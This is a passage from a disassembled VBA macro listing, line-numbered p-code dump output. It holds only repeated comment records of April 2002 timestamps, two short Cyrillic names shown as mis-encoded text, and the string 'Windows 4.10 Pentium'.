' Line #7421:
' Line #7422:
' Line #7423:
' 	QuoteRem 0x0000 0x0010 "05.04.02 9:36:49"
' Line #7424:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7425:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7426:
' Line #7427:
' Line #7428:
' 	QuoteRem 0x0000 0x0011 "05.04.02 10:16:40"
' Line #7429:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7430:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7431:
' Line #7432:
' Line #7433:
' 	QuoteRem 0x0000 0x0011 "05.04.02 12:03:24"
' Line #7434:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7435:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7436:
' Line #7437:
' Line #7438:
' 	QuoteRem 0x0000 0x0011 "05.04.02 12:22:04"
' Line #7439:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7440:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7441:
' Line #7442:
' Line #7443:
' 	QuoteRem 0x0000 0x0011 "05.04.02 12:52:34"
' Line #7444:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7445:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7446:
' Line #7447:
' Line #7448:
' 	QuoteRem 0x0000 0x0011 "05.04.02 15:14:32"
' Line #7449:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7450:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7451:
' Line #7452:
' Line #7453:
' 	QuoteRem 0x0000 0x0011 "05.04.02 16:24:30"
' Line #7454:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7455:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7456:
' Line #7457:
' Line #7458:
' 	QuoteRem 0x0000 0x0011 "05.04.02 16:24:58"
' Line #7459:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7460:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7461:
' Line #7462:
' Line #7463:
' 	QuoteRem 0x0000 0x0011 "05.04.02 16:26:20"
' Line #7464:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7465:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7466:
' Line #7467:
' Line #7468:
' 	QuoteRem 0x0000 0x0011 "05.04.02 16:26:55"
' Line #7469:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7470:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7471:
' Line #7472:
' Line #7473:
' 	QuoteRem 0x0000 0x0011 "05.04.02 16:27:28"
' Line #7474:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7475:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7476:
' Line #7477:
' Line #7478:
' 	QuoteRem 0x0000 0x0011 "08.04.02 13:51:26"
' Line #7479:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7480:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7481:
' Line #7482:
' Line #7483:
' 	QuoteRem 0x0000 0x0011 "08.04.02 16:35:50"
' Line #7484:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7485:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7486:
' Line #7487:
' Line #7488:
' 	QuoteRem 0x0000 0x0011 "08.04.02 16:37:17"
' Line #7489:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7490:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7491:
' Line #7492:
' Line #7493:
' 	QuoteRem 0x0000 0x0011 "08.04.02 16:45:48"
' Line #7494:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7495:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7496:
' Line #7497:
' Line #7498:
' 	QuoteRem 0x0000 0x0010 "09.04.02 9:33:45"
' Line #7499:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7500:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7501:
' Line #7502:
' Line #7503:
' 	QuoteRem 0x0000 0x0011 "09.04.02 11:47:59"
' Line #7504:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7505:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7506:
' Line #7507:
' Line #7508:
' 	QuoteRem 0x0000 0x0011 "09.04.02 11:52:07"
' Line #7509:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7510:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7511:
' Line #7512:
' Line #7513:
' 	QuoteRem 0x0000 0x0011 "09.04.02 12:23:19"
' Line #7514:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7515:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7516:
' Line #7517:
' Line #7518:
' 	QuoteRem 0x0000 0x0011 "09.04.02 12:25:16"
' Line #7519:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7520:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7521:
' Line #7522:
' Line #7523:
' 	QuoteRem 0x0000 0x0011 "09.04.02 12:28:17"
' Line #7524:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7525:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7526:
' Line #7527:
' Line #7528:
' 	QuoteRem 0x0000 0x0011 "09.04.02 12:29:53"
' Line #7529:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7530:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7531:
' Line #7532:
' Line #7533:
' 	QuoteRem 0x0000 0x0011 "09.04.02 13:06:08"
' Line #7534:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7535:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7536:
' Line #7537:
' Line #7538:
' 	QuoteRem 0x0000 0x0011 "09.04.02 14:55:24"
' Line #7539:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7540:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7541:
' Line #7542:
' Line #7543:
' 	QuoteRem 0x0000 0x0011 "09.04.02 14:57:48"
' Line #7544:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7545:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7546:
' Line #7547:
' Line #7548:
' 	QuoteRem 0x0000 0x0011 "09.04.02 15:09:27"
' Line #7549:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7550:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7551:
' Line #7552:
' Line #7553:
' 	QuoteRem 0x0000 0x0011 "09.04.02 16:23:37"
' Line #7554:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7555:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7556:
' Line #7557:
' Line #7558:
' 	QuoteRem 0x0000 0x0011 "09.04.02 17:00:09"
' Line #7559:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7560:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7561:
' Line #7562:
' Line #7563:
' 	QuoteRem 0x0000 0x0011 "09.04.02 17:59:17"
' Line #7564:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7565:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7566:
' Line #7567:
' Line #7568:
' 	QuoteRem 0x0000 0x0011 "09.04.02 18:35:07"
' Line #7569:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7570:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7571:
' Line #7572:
' Line #7573:
' 	QuoteRem 0x0000 0x0011 "09.04.02 18:45:03"
' Line #7574:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7575:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7576:
' Line #7577:
' Line #7578:
' 	QuoteRem 0x0000 0x0011 "09.04.02 18:45:58"
' Line #7579:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7580:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7581:
' Line #7582:
' Line #7583:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:06:23"
' Line #7584:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7585:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7586:
' Line #7587:
' Line #7588:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:07:23"
' Line #7589:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7590:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7591:
' Line #7592:
' Line #7593:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:08:16"
' Line #7594:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7595:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7596:
' Line #7597:
' Line #7598:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:08:44"
' Line #7599:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7600:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7601:
' Line #7602:
' Line #7603:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:09:13"
' Line #7604:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7605:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7606:
' Line #7607:
' Line #7608:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:10:00"
' Line #7609:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7610:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7611:
' Line #7612:
' Line #7613:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:10:38"
' Line #7614:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7615:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7616:
' Line #7617:
' Line #7618:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:11:33"
' Line #7619:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7620:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7621:
' Line #7622:
' Line #7623:
' 	QuoteRem 0x0000 0x0011 "10.04.02 10:25:47"
' Line #7624:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7625:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7626:
' Line #7627:
' Line #7628:
' 	QuoteRem 0x0000 0x0011 "10.04.02 14:58:32"
' Line #7629:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7630:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7631:
' Line #7632:
' Line #7633:
' 	QuoteRem 0x0000 0x0011 "10.04.02 15:52:09"
' Line #7634:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7635:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7636:
' Line #7637:
' Line #7638:
' 	QuoteRem 0x0000 0x0011 "10.04.02 15:54:07"
' Line #7639:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7640:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7641:
' Line #7642:
' Line #7643:
' 	QuoteRem 0x0000 0x0011 "10.04.02 15:55:34"
' Line #7644:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7645:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7646:
' Line #7647:
' Line #7648:
' 	QuoteRem 0x0000 0x0011 "10.04.02 16:00:38"
' Line #7649:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7650:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7651:
' Line #7652:
' Line #7653:
' 	QuoteRem 0x0000 0x0011 "10.04.02 16:02:59"
' Line #7654:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7655:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7656:
' Line #7657:
' Line #7658:
' 	QuoteRem 0x0000 0x0011 "10.04.02 16:05:06"
' Line #7659:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7660:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7661:
' Line #7662:
' Line #7663:
' 	QuoteRem 0x0000 0x0011 "10.04.02 16:05:47"
' Line #7664:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7665:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7666:
' Line #7667:
' Line #7668:
' 	QuoteRem 0x0000 0x0011 "10.04.02 16:07:13"
' Line #7669:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7670:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7671:
' Line #7672:
' Line #7673:
' 	QuoteRem 0x0000 0x0011 "10.04.02 17:06:22"
' Line #7674:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7675:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7676:
' Line #7677:
' Line #7678:
' 	QuoteRem 0x0000 0x0010 "11.04.02 9:47:08"
' Line #7679:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7680:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7681:
' Line #7682:
' Line #7683:
' 	QuoteRem 0x0000 0x0011 "11.04.02 12:19:18"
' Line #7684:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7685:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7686:
' Line #7687:
' Line #7688:
' 	QuoteRem 0x0000 0x0011 "11.04.02 12:21:31"
' Line #7689:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7690:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7691:
' Line #7692:
' Line #7693:
' 	QuoteRem 0x0000 0x0011 "11.04.02 14:05:27"
' Line #7694:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7695:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7696:
' Line #7697:
' Line #7698:
' 	QuoteRem 0x0000 0x0011 "11.04.02 14:26:54"
' Line #7699:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7700:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7701:
' Line #7702:
' Line #7703:
' 	QuoteRem 0x0000 0x0011 "11.04.02 15:57:58"
' Line #7704:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7705:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7706:
' Line #7707:
' Line #7708:
' 	QuoteRem 0x0000 0x0011 "11.04.02 16:42:54"
' Line #7709:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7710:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7711:
' Line #7712:
' Line #7713:
' 	QuoteRem 0x0000 0x0011 "11.04.02 16:47:55"
' Line #7714:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7715:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7716:
' Line #7717:
' Line #7718:
' 	QuoteRem 0x0000 0x0011 "11.04.02 17:06:35"
' Line #7719:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7720:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7721:
' Line #7722:
' Line #7723:
' 	QuoteRem 0x0000 0x0011 "11.04.02 17:09:20"
' Line #7724:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7725:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7726:
' Line #7727:
' Line #7728:
' 	QuoteRem 0x0000 0x0011 "11.04.02 17:17:24"
' Line #7729:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7730:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7731:
' Line #7732:
' Line #7733:
' 	QuoteRem 0x0000 0x0011 "11.04.02 17:22:08"
' Line #7734:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7735:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7736:
' Line #7737:
' Line #7738:
' 	QuoteRem 0x0000 0x0010 "12.04.02 9:06:22"
' Line #7739:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7740:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7741:
' Line #7742:
' Line #7743:
' 	QuoteRem 0x0000 0x0010 "12.04.02 9:08:31"
' Line #7744:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7745:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7746:
' Line #7747:
' Line #7748:
' 	QuoteRem 0x0000 0x0011 "12.04.02 11:00:05"
' Line #7749:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7750:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7751:
' Line #7752:
' Line #7753:
' 	QuoteRem 0x0000 0x0011 "12.04.02 11:47:05"
' Line #7754:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7755:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7756:
' Line #7757:
' Line #7758:
' 	QuoteRem 0x0000 0x0011 "12.04.02 11:57:39"
' Line #7759:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7760:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7761:
' Line #7762:
' Line #7763:
' 	QuoteRem 0x0000 0x0011 "12.04.02 12:45:13"
' Line #7764:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7765:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7766:
' Line #7767:
' Line #7768:
' 	QuoteRem 0x0000 0x0011 "12.04.02 13:02:40"
' Line #7769:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7770:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7771:
' Line #7772:
' Line #7773:
' 	QuoteRem 0x0000 0x0011 "12.04.02 13:24:04"
' Line #7774:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7775:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7776:
' Line #7777:
' Line #7778:
' 	QuoteRem 0x0000 0x0011 "12.04.02 13:24:12"
' Line #7779:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7780:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7781:
' Line #7782:
' Line #7783:
' 	QuoteRem 0x0000 0x0011 "12.04.02 13:45:43"
' Line #7784:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7785:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7786:
' Line #7787:
' Line #7788:
' 	QuoteRem 0x0000 0x0011 "12.04.02 14:11:59"
' Line #7789:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7790:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7791:
' Line #7792:
' Line #7793:
' 	QuoteRem 0x0000 0x0011 "12.04.02 14:37:47"
' Line #7794:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7795:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7796:
' Line #7797:
' Line #7798:
' 	QuoteRem 0x0000 0x0011 "12.04.02 14:48:41"
' Line #7799:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7800:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7801:
' Line #7802:
' Line #7803:
' 	QuoteRem 0x0000 0x0011 "12.04.02 15:07:42"
' Line #7804:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7805:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7806:
' Line #7807:
' Line #7808:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:29:26"
' Line #7809:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7810:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7811:
' Line #7812:
' Line #7813:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:30:00"
' Line #7814:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7815:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7816:
' Line #7817:
' Line #7818:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:32:55"
' Line #7819:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7820:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7821:
' Line #7822:
' Line #7823:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:33:25"
' Line #7824:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7825:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7826:
' Line #7827:
' Line #7828:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:34:45"
' Line #7829:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7830:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7831:
' Line #7832:
' Line #7833:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:46:58"
' Line #7834:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7835:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7836:
' Line #7837:
' Line #7838:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:48:07"
' Line #7839:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7840:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7841:
' Line #7842:
' Line #7843:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:48:31"
' Line #7844:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7845:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7846:
' Line #7847:
' Line #7848:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:50:10"
' Line #7849:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7850:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7851:
' Line #7852:
' Line #7853:
' 	QuoteRem 0x0000 0x0011 "15.04.02 10:50:51"
' Line #7854:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7855:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7856:
' Line #7857:
' Line #7858:
' 	QuoteRem 0x0000 0x0011 "15.04.02 11:11:00"
' Line #7859:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7860:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7861:
' Line #7862:
' Line #7863:
' 	QuoteRem 0x0000 0x0011 "15.04.02 12:23:27"
' Line #7864:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7865:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7866:
' Line #7867:
' Line #7868:
' 	QuoteRem 0x0000 0x0011 "15.04.02 12:31:18"
' Line #7869:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7870:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7871:
' Line #7872:
' Line #7873:
' 	QuoteRem 0x0000 0x0011 "15.04.02 12:59:54"
' Line #7874:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7875:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7876:
' Line #7877:
' Line #7878:
' 	QuoteRem 0x0000 0x0011 "15.04.02 13:00:59"
' Line #7879:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7880:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7881:
' Line #7882:
' Line #7883:
' 	QuoteRem 0x0000 0x0011 "15.04.02 15:53:41"
' Line #7884:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7885:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7886:
' Line #7887:
' Line #7888:
' 	QuoteRem 0x0000 0x0011 "15.04.02 16:15:00"
' Line #7889:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7890:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7891:
' Line #7892:
' Line #7893:
' 	QuoteRem 0x0000 0x0011 "18.04.02 11:58:50"
' Line #7894:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7895:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7896:
' Line #7897:
' Line #7898:
' 	QuoteRem 0x0000 0x0011 "18.04.02 11:59:51"
' Line #7899:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7900:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7901:
' Line #7902:
' Line #7903:
' 	QuoteRem 0x0000 0x0011 "18.04.02 17:55:55"
' Line #7904:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7905:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7906:
' Line #7907:
' Line #7908:
' 	QuoteRem 0x0000 0x0011 "18.04.02 18:02:08"
' Line #7909:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7910:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7911:
' Line #7912:
' Line #7913:
' 	QuoteRem 0x0000 0x0011 "18.04.02 18:58:28"
' Line #7914:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7915:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7916:
' Line #7917:
' Line #7918:
' 	QuoteRem 0x0000 0x0011 "18.04.02 19:01:04"
' Line #7919:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7920:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7921:
' Line #7922:
' Line #7923:
' 	QuoteRem 0x0000 0x0011 "18.04.02 19:02:30"
' Line #7924:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7925:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7926:
' Line #7927:
' Line #7928:
' 	QuoteRem 0x0000 0x0011 "18.04.02 19:21:50"
' Line #7929:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7930:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7931:
' Line #7932:
' Line #7933:
' 	QuoteRem 0x0000 0x0011 "18.04.02 19:22:24"
' Line #7934:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7935:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7936:
' Line #7937:
' Line #7938:
' 	QuoteRem 0x0000 0x0011 "18.04.02 19:53:45"
' Line #7939:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7940:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7941:
' Line #7942:
' Line #7943:
' 	QuoteRem 0x0000 0x0011 "18.04.02 21:38:35"
' Line #7944:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7945:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7946:
' Line #7947:
' Line #7948:
' 	QuoteRem 0x0000 0x0010 "19.04.02 8:18:43"
' Line #7949:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7950:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7951:
' Line #7952:
' Line #7953:
' 	QuoteRem 0x0000 0x0011 "19.04.02 12:44:39"
' Line #7954:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7955:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7956:
' Line #7957:
' Line #7958:
' 	QuoteRem 0x0000 0x0011 "19.04.02 13:03:12"
' Line #7959:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7960:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7961:
' Line #7962:
' Line #7963:
' 	QuoteRem 0x0000 0x0011 "19.04.02 13:03:28"
' Line #7964:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7965:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7966:
' Line #7967:
' Line #7968:
